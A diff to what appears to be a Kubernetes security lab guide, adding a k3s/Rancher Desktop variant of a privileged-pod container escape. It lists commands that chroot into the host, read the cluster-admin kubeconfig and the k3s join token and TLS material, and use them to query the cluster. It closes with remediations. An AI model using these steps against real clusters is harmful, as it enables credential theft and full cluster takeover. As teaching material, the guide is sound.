@@ -129,6 +129,69 @@ kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
 
 - Hooray 🥳 , now you can see that it returns the cluster nodes available as we have the privilege/permissions with obtained configuration to query the Kubernetes API server
 
+### 🎲 Method 2 (k3s / Rancher Desktop + WSL2)
+
+:::info
+
+Method 1 assumes a `kubeadm`-based cluster. On a **k3s** node (e.g. Rancher Desktop on WSL2) the binaries and config live in different places, so `chroot /host-system bash`, `crictl`, and `/etc/kubernetes/admin.conf` will not be found. Use the paths below instead.
+
+:::
+
+- The host image is minimal and may not ship `bash`. Enter the host with a shell that exists (fall back to `busybox sh` if needed):
+
+```bash
+chroot /host-system sh
+```
+
+```bash
+ls /host-system/bin /host-system/usr/bin | grep -E 'sh$|bash|busybox'
+```
+
+- On k3s, `crictl` and `ctr` are bundled into the `k3s` multi-call binary rather than on `PATH`. Call them through `k3s`:
+
+```bash
+k3s crictl pods
+```
+
+```bash
+k3s ctr -a /run/k3s/containerd/containerd.sock containers list
+```
+
+- If `k3s` is not on `PATH`, locate the runtime and binaries directly:
+
+```bash
+find / -name 'containerd.sock' 2>/dev/null; find / -name 'crictl' -o -name 'k3s' 2>/dev/null | head
+```
+
+- The cluster-admin kubeconfig on k3s is **not** at `/etc/kubernetes/admin.conf`. It lives at `/etc/rancher/k3s/k3s.yaml`:
+
+```bash
+cat /etc/rancher/k3s/k3s.yaml
+```
+
+- Use it to query cluster-wide resources (the `server:` field is usually `https://127.0.0.1:6443`, which works directly from the node):
+
+```bash
+k3s kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml get all -n kube-system
+```
+
+```bash
+k3s kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml get nodes
+```
+
+- If the admin kubeconfig is not readable, other node-level credentials worth collecting on k3s are the cluster CA / client certs and the agent join token:
+
+```bash
+ls -la /var/lib/rancher/k3s/server/tls/
+cat /var/lib/rancher/k3s/server/token
+```
+
+:::info
+
+The escalation chain is the same regardless of distribution: one misconfigured pod (hostPath `/` + privileged) → node filesystem → cluster-admin kubeconfig → full cluster compromise. The remediations (no hostPath `/`, drop `privileged`, remove `hostPID`/`hostIPC`, enforce Pod Security Admission `restricted`) break the chain at the first step.
+
+:::
+
 
 ## 🔖 References
 
